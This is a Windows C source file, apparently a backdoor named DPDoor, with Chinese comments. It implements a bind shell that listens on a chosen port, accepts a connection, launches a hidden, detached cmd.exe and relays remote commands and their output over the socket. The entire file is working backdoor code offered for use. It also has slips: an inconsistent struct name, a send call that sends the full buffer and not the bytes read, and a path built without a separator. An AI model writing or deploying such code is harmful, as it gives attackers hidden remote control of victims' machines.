#include "DPDoor.h"

BOOL g_bExit = FALSE;

BOOL StartShell(unsigned short uPort)
{
	if (!SocketInit())
	{
		return FALSE;
	}

	//创建服务端SOCKET
	SOCKET sService = socket(AF_INET, SOCK_STREAM, IPPROTO_IP);
	if (INVALID_SOCKET == sService)
	{
		return FALSE;
	}
	
	SOCKADDR_IN sAddress = { 0 };
	sAddress.sin_family = AF_INET;
	sAddress.sin_addr.s_addr = htonl(INADDR_ANY);
	sAddress.sin_port = htons(uPort);
	if (bind(sService, (SOCKADDR*)&sAddress, sizeof(SOCKADDR)))
	{
		return FALSE;
	}

	if (listen(sService, 5) == SOCKET_ERROR)
	{
		return FALSE;
	}

	SOCKET sAccept = accept(sService, NULL, NULL);
	
	//创建两个管道，分别用来将数据传入命令行，以及从命令行传出,1表示输入，2表示输出
	HANDLE hReadPipe1 = NULL;
	HANDLE hReadPipe2 = NULL;
	HANDLE hWritePipe1 = NULL;
	HANDLE hWritePipe2 = NULL;
	SECURITY_ATTRIBUTES sa = { 0 };
	sa.bInheritHandle = TRUE;
	if (!CreatePipe(&hReadPipe1, &hWritePipe1, &sa, 1024) || !CreatePipe(&hReadPipe2, &hWritePipe2, &sa, 1024))
	{
		return FALSE;
	}

	TCHAR szSystemDirectory[MAX_PATH + 1] = _T("");
	TCHAR szCmdLine[1024] = _T("");
	GetSystemDirectory(szSystemDirectory, MAX_PATH);
	StringCchPrintf(szCmdLine, 1024, _T("%s%s"), szSystemDirectory, _T("cmd.exe"));
	STARTUPINFO si = { 0 };
	si.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
	si.hStdInput = hReadPipe1;
	si.hStdError = si.hStdOutput = hWritePipe2;
	si.wShowWindow = SW_HIDE;
	PROCESS_INFORMATION pi = { 0 };
	PIPE_NONE Read_Node = { 0 };
	PIPE_NONE Write_Node = { 0 };
	Read_Node.hPipe = hReadPipe2;
	Read_Node.Socket = sAccept;
	Write_Node.hPipe = hWritePipe1;
	Write_Node.Socket = sAccept;
	CreateProcess(szCmdLine, szCmdLine, &sa, &sa, TRUE, DETACHED_PROCESS, NULL, szSystemDirectory, &si, &pi);
	DWORD dwThreadRead = 0, dwThreadWrite = 0;
	//创建两个线程，分别从socket中将远程的命令输入到管道中，以及从管道中读取命令返回结果并发送到远程主机
	HANDLE hThreadOutput = CreateThread(NULL, 0, ThreadReadProc, &Read_Node, 0, &dwThreadRead);
	HANDLE hThreadInput = CreateThread(NULL, 0, ThreadWriteProc, &Write_Node, 0, &dwThreadWrite);

	HANDLE hThread[] = { hThreadOutput , hThreadInput };
	WaitForMultipleObjects(2, hThread, TRUE, INFINITE);
	return TRUE;
}

BOOL SocketInit()
{
	WSADATA wd = { 0 };
	return (WSAStartup(MAKEWORD(2, 2), &wd) == 0) ? TRUE : FALSE;
}

DWORD WINAPI ThreadReadProc(LPVOID lpParameter)
{
	LPPIPE_NODE pPipeNode = (LPPIPE_NODE)lpParameter;
	char* szBuffer = (char*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, MAX_BUFFER_LENGTH);
	//读取长度，与总长度
	DWORD dwReadLen = 0;
	DWORD dwTotalAvail = 0;
	BOOL bRet = FALSE;
	while (!g_bExit)
	{
		dwTotalAvail = 0;
		bRet = PeekNamedPipe(pPipeNode->hPipe, NULL, 0, NULL, &dwTotalAvail, 0);
		if (bRet && dwTotalAvail > 0)
		{
			bRet = ReadFile(pPipeNode->hPipe, szBuffer, MAX_BUFFER_LENGTH, &dwReadLen, NULL);
			if (bRet && dwReadLen > 0)
			{
				send(pPipeNode->Socket, szBuffer, MAX_BUFFER_LENGTH, 0);
			}

			Sleep(50);
		}
	}
	return 0;
}

DWORD WINAPI ThreadWriteProc(LPVOID lpParameter)
{
	LPPIPE_NODE pPipeNode = (LPPIPE_NODE)lpParameter;
	DWORD dwWrited = 0, dwRecvd = 0;
	char szBuf[MAX_PATH] = { 0 };
	BOOL bRet = FALSE;
	while (!g_bExit)
	{
		dwRecvd = recv(pPipeNode->Socket, szBuf, MAX_PATH, 0);
		if (dwRecvd > 0 && dwRecvd != SOCKET_ERROR) {
			WriteFile(pPipeNode->hPipe, szBuf, dwRecvd, &dwWrited, NULL);
		}
		else {
			closesocket(pPipeNode->Socket);
			WriteFile(pPipeNode->hPipe, "exit\r\n", sizeof("exit\r\n"), &dwWrited, NULL);
			g_bExit = TRUE;
			break;
		}
		Sleep(50);
	}
	return 0;
}